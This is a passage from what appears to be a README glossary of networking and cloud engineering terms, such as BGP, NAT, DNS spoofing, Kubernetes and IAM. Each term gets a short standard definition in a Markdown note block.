> The rate of successful message delivery over a communication channel.

## Packet
> [!NOTE]
> A unit of data that is routed between an origin and a destination on the internet or any other packet-switched network.

## Ping
> [!NOTE]
> A networking utility used to test the reachability of a host on an Internet Protocol (IP) network and to measure the round-trip time for messages sent from the originating host to a destination computer.

## Traceroute
> [!NOTE]
> A network diagnostic tool that displays the route and measures transit delays of packets across an IP network.

## Load Balancing
> [!NOTE]
> The process of distributing network traffic across multiple servers.

## BGP (Border Gateway Protocol)
> [!NOTE]
> The protocol used to exchange routing information between networks on the internet.

## MPLS (Multiprotocol Label Switching)
> [!NOTE]
> A technique in high-performance telecommunications networks that directs data from one network node to the next based on short path labels rather than long network addresses.

## QoS (Quality of Service)
> [!NOTE]
> The description or measurement of the overall performance of a service, such as a telephony or computer network or a cloud computing service, particularly the performance seen by the users of the network.

## SDN (Software-Defined Networking)
> [!NOTE]
> An approach to network management that enables dynamic, programmatically efficient network configuration in order to improve network performance and monitoring.

## DNS Spoofing
> [!NOTE]
> An attack in which corrupted DNS data is inserted into the cache of a DNS resolver, returning an incorrect IP address.

## ARP (Address Resolution Protocol)
> [!NOTE]
> A protocol used for mapping an IP address to a physical machine address that is recognized in the local network.

## ICMP (Internet Control Message Protocol)
> [!NOTE]
> A network layer protocol used by network devices to diagnose network communication issues.

## SNMP (Simple Network Management Protocol)
> [!NOTE]
> An Internet Standard protocol for collecting and organizing information about managed devices on IP networks and for modifying that information to change device behavior.

## NAT Gateway
> [!NOTE]
> A service that allows instances in a private subnet to connect to services outside your VPC but prevents the outside services from initiating a connection with those instances.

## Firewall Rule
> [!NOTE]
> A defined set of rules used to control network traffic, allowing or denying communications based on criteria such as IP address, port number, or protocol.

## Port Forwarding
> [!NOTE]
> The process of redirecting a communication request from one address and port number combination to another while the packets traverse a network gateway, such as a router or firewall.

## IPSec (Internet Protocol Security)
> [!NOTE]
> A suite of protocols used to secure Internet Protocol (IP) communications by authenticating and encrypting each IP packet in a communication session.

## VLAN Trunking
> [!NOTE]
> A method of carrying multiple VLANs over a single network link between devices.

## Proxy Server
> [!NOTE]
> A server that acts as an intermediary for requests from clients seeking resources from other servers.

## Content Delivery Network (CDN)
> [!NOTE]
> A geographically distributed network of proxy servers and their data centers that delivers content to users based on their geographic location.

## DNS Resolution
> [!NOTE]
> The process of translating a domain name into its corresponding IP address.

## Network Segmentation
> [!NOTE]
> The practice of dividing a computer network into smaller parts, or segments, to improve performance and security.

## Route Table
> [!NOTE]
> A data table stored in a router or a networked computer that lists the routes to particular network destinations.

## ACL (Access Control List)
> [!NOTE]
> A list of rules used to grant or deny access to certain digital environments.

## Broadcast Domain
> [!NOTE]
> A logical division of a computer network, in which all nodes can reach each other by broadcast at the data link layer.

## Collision Domain
> [!NOTE]
> A network segment connected by a shared medium or through repeaters where simultaneous data transmissions can collide with one another.

## Network Latency
> [!NOTE]
> The time it takes for a data packet to travel from its source to its destination across a network.

## Network Topology
> [!NOTE]
> The arrangement of different elements (links, nodes, etc.) in a computer network.

## Network Bandwidth
> [!NOTE]
> The maximum data transfer rate of a network or Internet connection.

## Network Security
> [!NOTE]
> Policies and practices adopted to prevent and monitor unauthorized access, misuse, modification, or denial of a computer network and network-accessible resources.

## Wireless Network
> [!NOTE]
> A computer network that uses wireless data connections between network nodes.

## Ethernet
> [!NOTE]
> A family of computer networking technologies commonly used in local area networks (LAN), metropolitan area networks (MAN), and wide area networks (WAN).

## 802.11 Protocol
> [!NOTE]
> A set of standards that define communication for wireless local area networks (WLANs).

## VPN Tunnel
> [!NOTE]
> A secure connection between two or more devices across a public network like the Internet.

## Network Address Translation (NAT)
> [!NOTE]
> A method of modifying network address information in IP packet headers while in transit across a traffic routing device.

## Peering
> [!NOTE]
> The relationship between Internet service providers (ISPs) in which they exchange traffic between their networks.

## Load Balancer
> [!NOTE]
> A device or software that distributes network or application traffic across multiple servers to ensure availability and reliability.

# Cloud Engineering Dictionary
<p align="left">(<a href="#readme-top">back to top</a>)</p>
## Cloud Architecture
> [!NOTE]
> The components and subcomponents required for cloud computing, including databases, software capabilities, applications, and services.

## Multi-Cloud
> [!NOTE]
> The use of multiple cloud computing services in a single heterogeneous architecture.

## Cloud Native
> [!NOTE]
> A software approach that involves building and running applications that fully exploit the advantages of the cloud computing delivery model.

## Serverless Computing
> [!NOTE]
> A cloud-computing execution model where the cloud provider dynamically manages the allocation and provisioning of servers.

## Microservices
> [!NOTE]
> An architectural style that structures an application as a collection of loosely coupled services.

## Containerization
> [!NOTE]
> The packaging of software code with all its dependencies so that it can run uniformly and consistently on any infrastructure.

## Orchestration
> [!NOTE]
> The automated arrangement, coordination, and management of complex computer systems, middleware, and services.

## Infrastructure as a Service (IaaS)
> [!NOTE]
> A form of cloud computing that provides virtualized computing resources over the internet.

## Platform as a Service (PaaS)
> [!NOTE]
> A cloud computing model that delivers hardware and software tools to users over the internet.

## Software as a Service (SaaS)
> [!NOTE]
> A software licensing and delivery model in which software is licensed on a subscription basis and is centrally hosted.

## Function as a Service (FaaS)
> [!NOTE]
> A category of cloud computing services that provides a platform allowing customers to develop, run, and manage application functionalities without the complexity of building and maintaining the infrastructure.

## Cloud Security
> [!NOTE]
> A set of policies, controls, procedures, and technologies that work together to protect cloud-based systems, data, and infrastructure.

## Identity and Access Management (IAM)
> [!NOTE]
> A framework of policies and technologies for ensuring that the proper people in an enterprise have the appropriate access to technology resources.

## Auto Scaling
> [!NOTE]
> A cloud computing feature that automatically adjusts the amount of computational resources in a server farm based on the load.

## Elasticity
> [!NOTE]
> The ability of a cloud service to automatically scale computing resources up or down as needed.

## Availability Zones
> [!NOTE]
> Physically separate locations within a cloud provider’s data centers that help safeguard applications and data from data center failures.

## CloudFormation
> [!NOTE]
> An infrastructure as code (IaC) service from Amazon Web Services (AWS) that allows you to easily model and set up AWS resources.

## CloudTrail
> [!NOTE]
> A service that enables governance, compliance, operational auditing, and risk auditing of your AWS account.

## CloudWatch
> [!NOTE]
> A monitoring and observability service by AWS that provides data and actionable insights to monitor applications, understand and respond to system-wide performance changes, and optimize resource utilization.

## S3 (Simple Storage Service)
> [!NOTE]
> An object storage service that offers industry-leading scalability, data availability, security, and performance.

## Lambda
> [!NOTE]
> An AWS service that lets you run code without provisioning or managing servers.

## EC2 (Elastic Compute Cloud)
> [!NOTE]
> A web service that provides resizable compute capacity in the cloud, designed to make web-scale cloud computing easier for developers.

## VPC (Virtual Private Cloud)
> [!NOTE]
> A virtual network dedicated to your AWS account, logically isolated from other virtual networks in the AWS Cloud.

## Azure Resource Manager (ARM)
> [!NOTE]
> The deployment and management service for Azure, providing a consistent management layer that enables you to create, update, and delete resources in your Azure account.

## Azure DevOps
> [!NOTE]
> A set of services for DevOps, including CI/CD pipelines, version control, and Agile tools, integrated with

 Azure.

## Google Kubernetes Engine (GKE)
> [!NOTE]
> A managed, production-ready environment for running containerized applications, with support for Kubernetes orchestration.

## Anthos
> [!NOTE]
> Google Cloud’s application management platform that provides a consistent development and operations experience for cloud and on-premises environments.

## BigQuery
> [!NOTE]
> Google Cloud’s fully-managed, serverless, highly scalable, and cost-effective multi-cloud data warehouse.

## IAM Roles
> [!NOTE]
> A set of permissions that define what actions can be taken on what resources within a cloud environment.

## Cloud Storage
> [!NOTE]
> A service model in which data is maintained, managed, backed up remotely, and made available to users over a network.

## Cloud Firewall
> [!NOTE]
> A security service provided by cloud vendors that protects cloud infrastructure and resources from network threats.

## Kubernetes
> [!NOTE]
> An open-source system for automating the deployment, scaling, and management of containerized applications.

## Helm
> [!NOTE]
> A package manager for Kubernetes that helps you define, install, and upgrade even the most complex Kubernetes applications.

## Istio
> [!NOTE]
> An open-source service mesh that layers transparently onto existing distributed applications, providing services such as load balancing, service-to-service authentication, monitoring, and more.

## Terraform
> [!NOTE]
> An open-source infrastructure as code software tool that enables users to define and provision data center infrastructure using a high-level configuration language.

## Cloud Compliance
> [!NOTE]
> Ensuring that cloud usage adheres to laws, regulations, standards, and organizational policies.

## API Gateway
> [!NOTE]
> A service that provides a managed interface for developers to create, publish, maintain, monitor, and secure APIs at any scale.

## DevSecOps
> [!NOTE]
> An extension of DevOps that integrates security practices into the DevOps approach.

## Cloud Load Balancing
> [!NOTE]
> A fully distributed, software-defined managed service that provides global load balancing with a single IP address.

## Kubernetes Ingress
> [!NOTE]
> An API object that manages external access to services in a cluster, typically HTTP.

## Cloud Networking
> [!NOTE]
> The process of managing and configuring networks and communication systems in cloud environments.

## Cloud Cost Management
> [!NOTE]
> The process of tracking, monitoring, and managing cloud usage and costs to optimize spending.

## Cloud Analytics
> [!NOTE]
> The application of data analysis techniques to datasets stored in the cloud to uncover insights.

## Cloud Orchestration
> [!NOTE]
> The use of technology to manage and coordinate the interactions between different cloud services, typically in a multi-cloud environment.

## Service Mesh
> [!NOTE]
> A dedicated infrastructure layer for making service-to-service communication safe, fast, and reliable, usually within microservices architectures.

## FinOps
> [!NOTE]
> The practice of bringing together finance, technology, and business teams to collaborate on data-driven spending decisions in the cloud.

## Cloud Backup
> [!NOTE]
> The process of storing copies of data in a cloud environment to ensure its availability in case of system failures, disasters, or other data loss events.

## Hybrid Cloud
> [!NOTE]
> A computing environment that combines on-premises infrastructure, private cloud services, and a public cloud.

## Cloud Governance
> [!NOTE]
> The processes, rules, and policies that define how an organization operates in the cloud to ensure compliance, security, and effective management.

## Cloud-Native Security
> [!NOTE]
> A security approach designed specifically for securing cloud-native applications, which are built to leverage the cloud’s scalability and flexibility.
<p align="left">(<a href="#readme-top">back to top</a>)</p>

# Backlog

